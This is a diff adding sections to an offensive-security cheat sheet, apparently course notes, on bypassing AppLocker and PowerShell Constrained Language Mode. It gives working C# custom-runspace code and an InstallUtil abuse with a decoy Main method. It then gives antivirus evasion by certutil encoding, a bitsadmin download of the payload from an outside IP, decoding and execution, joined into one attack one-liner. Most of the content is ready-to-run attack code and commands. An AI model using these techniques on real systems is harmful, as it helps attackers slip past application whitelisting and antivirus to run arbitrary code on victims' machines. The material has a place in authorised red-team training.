@@ -2251,6 +2251,44 @@ wscript "C:\path\to\my\file.log:test.js"
 ```
 
 ## Bypassing AppLocker
+### Custom Runspaces - Bypass CLM
+PowerShell.exe is essentially a GUI application handling input and output. The real functionality lies inside the System.Management.Automation.dll managed DLL, which PowerShell.exe calls to create a runspace.
+
+It is possible to leverage multithreading and parallel task execution through either Jobs or Runspaces. The APIs for creating a runspace are public and available to managed code written in C#.
+
+This means we could code a C# application that creates a custom PowerShell runspace and executes our script inside it. This is beneficial since, as we will demonstrate, custom runspaces are not restricted by AppLocker. Using this approach, we can construct a constrained language mode bypass to allow arbitrary PowerShell execution.
+
+```csharp
+using System;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+
+namespace Bypass
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            # Create Runspace
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
+            
+            # Instantiate PowerShell Object and assign Runspace 
+            PowerShell ps = PowerShell.Create();
+            ps.Runspace = rs;
+
+            # Write contents of LanguageMode variable to file
+            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
+            ps.AddScript(cmd);
+            ps.Invoke();
+            rs.Close();
+
+            
+        }
+    }
+}
+```
+
 ### Powershell Constrained Language Mode (CLM) Bypass
 
 The PowerShell execution policy restricts the execution of scripts, but this is a weak protection mechanism 
@@ -2266,6 +2304,111 @@ Get the LanguageMode in Powershell:
 ```powershell
 $ExecutionContext.SessionState.LanguageMode
 ```
+
+To bypass Applocker we will leverage InstallUtil, a command-line utility that allows us to install and uninstall server resources by executing the installer components in a specified assembly. This Microsoft-supplied tool obviously has legitimate uses, but we can abuse it to execute arbitrary C# code. Our goal is to reintroduce our PowerShell shellcode runner tradecraft in an AppLocker-protected environment.
+
+To use InstallUtil in this way, we must put the code we want to execute inside either the install or uninstall methods of the installer class.
+
+We are only going to use the uninstall method since the install method requires administrative privileges to execute.
+
+<details>
+  <summary>Expand</summary>
+
+```csharp
+using System;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Configuration.Install;
+
+namespace Bypass
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine("This is the main method which is a decoy");
+        }
+    }
+
+    [System.ComponentModel.RunInstaller(true)]
+    public class Sample : System.Configuration.Install.Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
+
+            PowerShell ps = PowerShell.Create();
+            ps.Runspace = rs;
+
+            ps.AddScript(cmd);
+
+            ps.Invoke();
+
+            rs.Close();
+        }
+    }
+}
+```
+
+Compile and executing the binary with administrative command prompt:
+
+```powershell
+C:\Tools>Bypass.exe
+This is the main method which is a decoy
+```
+
+If we execute it with non-administrative command prompt:
+```powershell
+C:\Users\student>C:\Tools\Bypass.exe
+This program is blocked by group policy. For more information, contact your system administrator.
+```
+
+To now bypass AppLocker we use the installutil.exe:
+
+```powershell
+C:\Users\student>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe
+Microsoft (R) .NET Framework Installation utility Version 4.8.3752.0
+Copyright (C) Microsoft Corporation.  All rights reserved.
+
+
+C:\Users\student>type C:\Tools\test.txt
+FullLanguage
+```
+
+To bypass AV we can encode our binary and transfer the encoded blob, decode it on victim and execute it in memory.
+
+```powershell
+C:\Users\Offsec>certutil -encode C:\Users\Offsec\source\repos\Bypass\Bypass\bin\x64\Release\Bypass.exe file.txt
+```
+
+Download the file
+```powershell
+C:\Users\student>bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\Users\student\enc.txt
+```
+
+Decode
+```powershell
+C:\Users\student>certutil -decode enc.txt Bypass.exe
+```
+
+Execute
+```powershell
+C:\Users\student>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe
+```
+
+One-Liner from all commands
+```powershell
+bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe 
+
+```
+
+</details>
+
+
+
+
 
 
 
